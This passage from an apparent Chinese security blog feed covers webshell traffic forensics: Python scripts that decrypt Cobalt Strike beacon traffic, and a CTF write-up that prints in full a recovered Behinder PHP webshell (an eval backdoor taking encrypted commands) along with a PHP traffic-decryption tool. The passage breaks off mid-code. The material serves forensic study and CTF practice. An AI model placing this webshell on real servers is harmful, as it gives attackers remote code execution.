db604f9725f38c182f986c3d8a3af3e782f659b2eb8341ad3cbf7016e0a17e4bb6c17e1159f3bcfb515fa7cf45e7a86795b3fa9ee4e26019750839746bbf3ff2d08c51d6a613b1ede7de3336faebd3918f0deb7d5413c78595ac89e1e0a3a83c5d47db60dc6d0ca9754dd05fb5d6df88549889b96b3e008b2d6c97c64d63111f2023ab15640c65c594fd873307cf798f00b96cf0e307d9ba79b13fd40f51d890335502d8bb0569348fa89b05b60b0fc721aedc20479e4c854d4b9e876110c119d59b8119147de189478a10668a3831e7de3b0add3cf7c5642ab9bd3d3f27b40ba2994c86a0d42011af66e164626ac35fdcfe0ff4336ae576b2a897793fcc9c7d6f9797031d33f7fede697d3aa6852226436f30b8f8b591ce89301df59664dd5d55a8e7ebc1af52ae5f0f1bc22cdc83faa4c43aa47071ab935675463920a9f7cb07fca00feb32c4d23885f297beefcd464da80266bb7568cf10a6cc5230b01f2dcac2d420a18a37710dbadec81554ed636dcd340616103d405eacb67fa9e6e9b55e7f151d6b81744152716436c45b0c33712a2c68f2fe5df95b81e93efcb087fa8929838118eb12943b4d719cea6d1c56f6be315b3bbc69894bb3605880825ffbda5411342aafe4e5dff6ec71792f1be673fff0a7f9fa3c746582ca58425b8f3f2d0c978253466931b348efd6205535c874a8acd2bc912f9e2366fc1e19cec566a40785c94a1d2ab02c078a93d5797bceb67369104d5ba0807210969eece4cab8f2642c99f59740f10f187e9366d5ae9e101853a13739ac2f5b75bcc77f1af7b2c1477604a5e5e89632d40252198263f4a3f987db2fe2defc67b1c63df5670d57d0ce3e354fef742267f553635972a5299854f8f9c39abe423dcef8153b5f29cbe889c6793e6a04cd7bab4411ec68cc255dbde99d3e855dab56c14ae44197f32f753d357e912430329f22c3d1162fecc5ef72f5f85d65d4c450cbb26c59e8091a8e2dfc77013c279b29a8993b33c8e8035c3c3d146a8194d8b1e375f3f05ebd00fadfddac0167bdbc423a3c3ae98d30c134832b6c044c071ac405d12d43ca08a5eb93f9818adcadf0d85b89e71539b2f552bbe07478f9d061ce794b4fcaa29ed6bb44b95517458f3c6aa31a3e1b373acb729c92ac1e025f0f4d13ccb8e22afacce795cbacd079d60be22e2a030c179cdca6ceacefc7d50fedbc7cdfbbdeb784f17841a9be5ec77b591f3538cb90bad269afd37887f65712a64271ef1c98bd549e14416ec0dd05e37f7a9119e3496ac096a9f114ced66df699c8e6b0aa5504fd27e20e36759be5c0db6b1cef4db0222912882efa42d801f04c5ca2f204c1729054153b27808a47401373d7d856475094553b29dc6736d5553ef4f52c987b310a7ed15cded74ee4bb124b44d9426c42e6cacd4eee3ae82334c66fcb8e4a37520c31fbe8458b4bef04dfb228f2af18f9d7a2e1b3fb0da3b9fc930479aa035988139cee1022403b66a6c0e63ff27c6ca3ec25fcee83de90bc43b4b599d05f592ed5589f574a665e0c3ef3abc3336ceb467a10435291734151e6d74b50715017045c03a0e2868482e75e30e4677d2cb1b939537dd51fcb694adbd6d2afeaadc1b782f3173ee5b78c07c8c0fc6c1d8492770d9e5bbaa5ac00891ae328c53a197359d20a224592a05264e22314715256e46ab5a04e08b71b636d82f39d108862ec5b389d9bb85814239bfe0117534b165c0bd467dfdc31d99cee1e0793c8240ae327c00f2bbf1f6df8b9c9b46263f3c124bbd448471cdcab0b0e92a88dd0384e5c733add241a76e625342eed9d701ced104fd106858ea17f91d1c41fce5aa155d8e4c287455bd76f68748458416e0f2e9df248d998e4e67dd606ae0a7d1ab2c825389b566797a7b1845e78ad81b75faf3235edfade3e767488d9bdb9b4</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>webshell流量分析</title>
    <url>/2024/04/01/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>cs 流量</p>
<p>冰蝎流量</p>
<p>蚁剑流量</p>
<p>哥斯拉流量</p>
<span id="more"></span>

<h1 id="cs-流量"><a href="#cs-流量" class="headerlink" title="cs 流量"></a>cs 流量</h1><p>流量特征值</p>
<p>存在两个文件</p>
<p>.cobaltstrike.beacon_keys</p>
<p>pcapng</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hexdump</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> javaobj.v2 <span class="keyword">as</span> javaobj</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_arguments</span>():</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-f&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&quot;输入JAVA序列化文件 .cobaltstrike.beacon_keys 路径&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> parser.parse_args()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_RSA_PriKey</span>(<span class="params">SerializeKeyPath</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(SerializeKeyPath, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fd:</span><br><span class="line">        pobj = javaobj.load(fd)</span><br><span class="line">    privateKey = pobj.array.value.privateKey.encoded.data</span><br><span class="line">    publicKey = pobj.array.value.publicKey.encoded.data</span><br><span class="line"></span><br><span class="line">    privateKey = (</span><br><span class="line">            <span class="string">b&quot;-----BEGIN PRIVATE KEY-----\n&quot;</span></span><br><span class="line">            + base64.encodebytes(<span class="built_in">bytes</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: x &amp; <span class="number">0xFF</span>, privateKey)))</span><br><span class="line">            + <span class="string">b&quot;-----END PRIVATE KEY-----&quot;</span></span><br><span class="line">    )</span><br><span class="line">    publicKey = (</span><br><span class="line">            <span class="string">b&quot;-----BEGIN PUBLIC KEY-----\n&quot;</span></span><br><span class="line">            + base64.encodebytes(<span class="built_in">bytes</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: x &amp; <span class="number">0xFF</span>, publicKey)))</span><br><span class="line">            + <span class="string">b&quot;-----END PUBLIC KEY-----&quot;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    privateKey = privateKey.decode()</span><br><span class="line">    publicKey = publicKey.decode()</span><br><span class="line">    <span class="keyword">return</span> publicKey, privateKey</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_PK_Cipher</span>(<span class="params">privateKey</span>):</span><br><span class="line">    privateKey = RSA.import_key(privateKey.encode())</span><br><span class="line">    n_bytes = privateKey.n.bit_length() // <span class="number">8</span></span><br><span class="line">    cipher = PKCS1_v1_5.new(privateKey)</span><br><span class="line">    <span class="keyword">return</span> cipher, n_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">private_decrypt</span>(<span class="params">cipher_text, privateKey</span>):</span><br><span class="line">    cipher, n_bytes = create_PK_Cipher(privateKey)</span><br><span class="line">    cipher_text = base64.b64decode(cipher_text.encode())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span>.join(</span><br><span class="line">        cipher.decrypt(cipher_text[i: i + n_bytes], <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(cipher_text), n_bytes)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_AES_HMAC_Key</span>(<span class="params">SerializeKeyPath, rsa_cipher_text</span>):</span><br><span class="line">    _, privateKey = get_RSA_PriKey(SerializeKeyPath)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (plain_text := private_decrypt(rsa_cipher_text, privateKey)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+]: 解密错误, 可能是RSA_Cipher_Text或者密钥有误!&quot;</span>)</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    raw_aes_keys = plain_text[<span class="number">8</span>:<span class="number">24</span>]</span><br><span class="line">    raw_aes_hash256 = hashlib.sha256(raw_aes_keys)</span><br><span class="line">    digest = raw_aes_hash256.digest()</span><br><span class="line">    aes_key = digest[:<span class="number">16</span>]</span><br><span class="line">    hmac_key = digest[<span class="number">16</span>:]</span><br><span class="line">    <span class="keyword">return</span> aes_key, hmac_key, plain_text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    args = parse_arguments()</span><br><span class="line">    SerializeKeyPath = args.f</span><br><span class="line"><span class="comment">#此处放置load导出的cookie</span></span><br><span class="line">    rsa_cipher_text = <span class="string">&quot;xeoOUNy9EhFV01fTyqDHJTvrnfCji6iHiLabfNhxoLKdY6xA8HV8g8fmvrgs6J4d3MjdhG9ww/CAj6tEFj3Y1hfcODoOz+ggqc5jb7lcGuEHmuN7j0NawY8t5Ro7vbnDJmGF9a7Zve3v3cYHEZexDjTgfl+119fyM6hWOuXd5LM=&quot;</span></span><br><span class="line">    aes_key, hmac_key, plain_text = get_AES_HMAC_Key(SerializeKeyPath, rsa_cipher_text)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;AES key: <span class="subst">&#123;aes_key.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;HMAC key: <span class="subst">&#123;hmac_key.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    hexdump.hexdump(plain_text)</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python cs.py -f .cobaltstrike.beacon_keys</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AES key:5f277b49bb4b15cc0728835639d691fc</span><br><span class="line">HMAC key:8c67ccf3324dae539604a6e019a57664</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Beacon任务执行结果解密</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> hexdump</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compare_mac</span>(<span class="params">mac, mac_verif</span>):</span><br><span class="line">	<span class="keyword">if</span> mac == mac_verif:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(mac) != <span class="built_in">len</span>(mac_verif):</span><br><span class="line">		<span class="built_in">print</span></span><br><span class="line">		<span class="string">&quot;invalid MAC size&quot;</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">	result = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(mac, mac_verif):</span><br><span class="line">		result |= x ^ y</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> result == <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">encrypted_data, iv_bytes, signature, shared_key, hmac_key</span>):</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> compare_mac(hmac.new(hmac_key, encrypted_data, digestmod=<span class="string">&quot;sha256&quot;</span>).digest()[<span class="number">0</span>:<span class="number">16</span>], signature):</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;message authentication failed&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">	cypher = AES.new(shared_key, AES.MODE_CBC, iv_bytes)</span><br><span class="line">	data = cypher.decrypt(encrypted_data)</span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment">#key源自Beacon_metadata_RSA_Decrypt.py</span></span><br><span class="line">SHARED_KEY = binascii.unhexlify(<span class="string">&quot;5f277b49bb4b15cc0728835639d691fc&quot;</span>)</span><br><span class="line">HMAC_KEY = binascii.unhexlify(<span class="string">&quot;8c67ccf3324dae539604a6e019a57664&quot;</span>)</span><br><span class="line"><span class="comment"># 密文 原始数据 hex 解码 base64加密</span></span><br><span class="line"></span><br><span class="line">encrypt_data=<span class="string">&quot;AAAAUJwE+4Qyg3PGsdV+8stF4umcLlO5zBdLb0WRnKAT9cEjsKqM7DiRiWBGBMpksTmEVk+s+DJY+obKpkiG3j0COF04qLaB8INl6IaF+kqCeauM&quot;</span></span><br><span class="line"></span><br><span class="line">encrypt_data=base64.b64decode(encrypt_data)</span><br><span class="line"></span><br><span class="line">encrypt_data_length=encrypt_data[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">encrypt_data_length=<span class="built_in">int</span>.from_bytes(encrypt_data_length, byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">encrypt_data_l = encrypt_data[<span class="number">4</span>:<span class="built_in">len</span>(encrypt_data)]</span><br><span class="line"></span><br><span class="line">data1=encrypt_data_l[<span class="number">0</span>:encrypt_data_length-<span class="number">16</span>]</span><br><span class="line">signature=encrypt_data_l[encrypt_data_length-<span class="number">16</span>:encrypt_data_length]</span><br><span class="line">iv_bytes = <span class="built_in">bytes</span>(<span class="string">&quot;abcdefghijklmnop&quot;</span>,<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dec=decrypt(data1,iv_bytes,signature,SHARED_KEY,HMAC_KEY)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">counter = dec[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">counter=<span class="built_in">int</span>.from_bytes(counter, byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;counter:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(counter))</span><br><span class="line"></span><br><span class="line">dec_length = dec[<span class="number">4</span>:<span class="number">8</span>]</span><br><span class="line">dec_length=<span class="built_in">int</span>.from_bytes(dec_length, byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;任务返回长度:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(dec_length))</span><br><span class="line"></span><br><span class="line">de_data= dec[<span class="number">8</span>:<span class="built_in">len</span>(dec)]</span><br><span class="line">Task_type=de_data[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">Task_type=<span class="built_in">int</span>.from_bytes(Task_type, byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;任务输出类型:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(Task_type))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(de_data[<span class="number">4</span>:dec_length].decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>))    <span class="comment"># 第69行</span></span><br><span class="line"><span class="built_in">print</span>(hexdump.hexdump(dec))</span><br></pre></td></tr></table></figure>

<h1 id="冰蝎流量"><a href="#冰蝎流量" class="headerlink" title="冰蝎流量"></a>冰蝎流量</h1><p>流量特征</p>
<p>Easy_Shark<br><a href="https://github.com/nyyyddddn/ctf/blob/main/Sictf2023%20%23Round%202/misc/Easy_Shark.zip">https://github.com/nyyyddddn/ctf/blob/main/Sictf2023%20%23Round%202/misc/Easy_Shark.zip</a></p>
<p>追踪http 流 发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">    $key=&quot;2295d22e2d70888f&quot;;</span><br><span class="line">	$_SESSION[&#x27;k&#x27;]=$key;</span><br><span class="line">	$post=file_get_contents(&quot;php://input&quot;);</span><br><span class="line">	if(!extension_loaded(&#x27;openssl&#x27;))</span><br><span class="line">	&#123;</span><br><span class="line">		$t=&quot;base64_&quot;.&quot;decode&quot;;</span><br><span class="line">		$post=$t($post.&quot;&quot;);</span><br><span class="line">		</span><br><span class="line">		for($i=0;$i&lt;strlen($post);$i++) &#123;</span><br><span class="line">    			 $post[$i] = $post[$i]^$key[$i+1&amp;15]; </span><br><span class="line">    			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		$post=openssl_decrypt($post, &quot;AES128&quot;, $key);</span><br><span class="line">	&#125;</span><br><span class="line">    $arr=explode(&#x27;|&#x27;,$post);</span><br><span class="line">    $func=$arr[0];</span><br><span class="line">    $params=$arr[1];</span><br><span class="line">	class C&#123;public function __invoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125;</span><br><span class="line">    @call_user_func(new C(),$params);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$key=&quot;2295d22e2d70888f&quot;;</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="title function_ invoke__">getopt</span>(<span class="string">&#x27;a:k:f:t:d:&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;进入php文件\n\n\n\n\n&quot;</span>;</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$arr</span>[<span class="string">&#x27;k&#x27;</span>])?<span class="variable">$key</span>=<span class="variable">$arr</span>[<span class="string">&#x27;k&#x27;</span>]:<span class="variable">$key</span>=<span class="string">&#x27;e45e329feb5d925b&#x27;</span>;</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$arr</span>[<span class="string">&#x27;t&#x27;</span>])?<span class="variable">$http_type</span>=<span class="variable">$arr</span>[<span class="string">&#x27;t&#x27;</span>]:<span class="variable">$http_type</span>=<span class="string">&#x27;requests&#x27;</span>;</span><br><span class="line"><span class="comment">// echo &quot;this is \$key:&quot;.$key.&quot;\n this is \$http_type:&quot;.$http_type;</span></span><br><span class="line"><span class="comment">// echo &quot;\$post is :&quot;.$post.&quot;\n\n&quot;;</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$arr</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$arr</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="variable">$post_raw</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$arr</span>[<span class="string">&#x27;d&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;d&#x27;</span>] = <span class="string">&#x27;t&#x27;</span>;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$arr</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$post_raw</span>= <span class="variable">$arr</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_convert_str</span>(<span class="params"><span class="variable">$post_raw</span>,<span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// preg_match(&#x27;//&#x27;);</span></span><br><span class="line">    <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z0-9\+\=\/]&#123;24,&#125;/i&#x27;</span>,<span class="variable">$post_raw</span>,<span class="variable">$post</span>);</span><br><span class="line">    <span class="comment">// echo &quot;\$post is :&quot;.$post[0];</span></span><br><span class="line">    <span class="comment">// echo &quot;aes的数据为：&quot;;</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$post</span>) === <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// echo &quot;进入intoaes函数：&quot;.$post[0];</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$post</span>) === <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable">$post</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$post</span>[<span class="number">0</span>], <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (\<span class="built_in">Throwable</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="comment">//日志方法，具体自己实现</span></span><br><span class="line">        <span class="comment">// CoreHelper::write(json_encode([&#x27;eventName&#x27;,&#x27;order_id&#x27;=&gt;$order-&gt;order_id??&#x27;&#x27;,$e-&gt;getMessage()], JSON_UNESCAPED_UNICODE)); </span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// var_dump($post);</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$post</span> == <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$post</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xor_convert_str</span>(<span class="params"><span class="variable">$post_raw</span>,<span class="variable">$key</span>,<span class="variable">$http_type</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// echo &quot;进入intoxor函数1,raw_data is :&quot;.$post_raw.&quot;xixixi\n\n\n\n\n\n\n&quot;;</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$http_type</span> == <span class="string">&#x27;requests&#x27;</span>)&#123;</span><br><span class="line">        <span class="comment">// echo &quot;this is :&quot;.$http_type.&quot;\n&quot;;</span></span><br><span class="line">		<span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line">        <span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post_raw</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="variable">$post_raw</span> = <span class="variable">$post</span>;</span><br><span class="line">        <span class="comment">// echo &quot;this is \033[[95mrequests\033[[1m&quot;;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// echo &quot;thisresponse&quot;;</span></span><br><span class="line">        <span class="variable">$post</span> = <span class="variable">$post_raw</span>;</span><br><span class="line">        <span class="variable">$pattern</span> = <span class="string">&#x27;&lt;b&gt;Warning&lt;/b&gt;:  session_start(): Cannot send session cache limiter - headers already sent in &lt;b&gt;D:\phpstudy_pro\WWW\sqli-labs\shell.php&lt;/b&gt; on line &lt;b&gt;3&lt;/b&gt;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">        <span class="comment">// $pattern = &#x27;on line &lt;b&gt;3&lt;/b&gt;&lt;br /&gt;&#x27;;</span></span><br><span class="line">        <span class="comment">// echo &quot;hereis\$post&quot;.$post.&quot;\n\n\n\n&quot;;</span></span><br><span class="line">        <span class="comment">// var_dump(strpos($post,$pattern));</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$post</span>,<span class="variable">$pattern</span>) != <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$result</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$post</span>,<span class="title function_ invoke__">strpos</span>(<span class="variable">$post</span>,<span class="variable">$pattern</span>)+<span class="title function_ invoke__">strlen</span>(<span class="variable">$pattern</span>)+<span class="number">1</span>);</span><br><span class="line">            <span class="comment">// echo &quot;thatshouldberesult&quot;.$result.&quot;tty&quot;;</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$result</span> != <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">                <span class="variable">$post</span> = <span class="variable">$result</span>;</span><br><span class="line">                <span class="comment">// echo &quot;intotheconvert&quot;;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">    			 <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">                &#125;</span><br><span class="line">    <span class="comment">// echo &quot;进入intoxor函数2&quot;.$post.&quot;xixixi&quot;;</span></span><br><span class="line">    <span class="comment">// echo &quot;this is \$post:&quot;.$post;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$post</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$post</span> = <span class="title function_ invoke__">aes_convert_str</span>(<span class="variable">$post_raw</span>,<span class="variable">$key</span>);</span><br><span class="line"><span class="comment">// echo &quot;aes函数complate&quot;.$post.&quot;\n&quot;;</span></span><br><span class="line"><span class="variable">$post</span> === <span class="string">&#x27;no&#x27;</span>?<span class="variable">$post</span> = <span class="title function_ invoke__">xor_convert_str</span>(<span class="variable">$post_raw</span>,<span class="variable">$key</span>,<span class="variable">$http_type</span>):<span class="variable">$post</span>;</span><br><span class="line"><span class="comment">// echo &quot;this is \$post&quot;.$post;</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\&#123;/i&#x27;</span>,<span class="variable">$post</span>))&#123;</span><br><span class="line">    <span class="comment">// echo $post;</span></span><br><span class="line">    <span class="comment">// exit();</span></span><br><span class="line">    <span class="comment">// echo &quot;error is &quot;.$post;</span></span><br><span class="line">    <span class="variable">$raw_data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$post</span>);</span><br><span class="line">    <span class="variable">$result</span> = [];</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$raw_data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">            <span class="variable">$result</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$value</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 捕获异常</span></span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Message: &#x27;</span> .<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$arr_2</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$post</span>);</span><br><span class="line"><span class="variable">$func</span> = <span class="variable">$arr_2</span>[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$arr_2</span>[<span class="number">1</span>])?<span class="variable">$parm</span>=<span class="variable">$arr_2</span>[<span class="number">1</span>]:<span class="variable">$parm</span>=<span class="variable">$func</span>;      <span class="comment"># 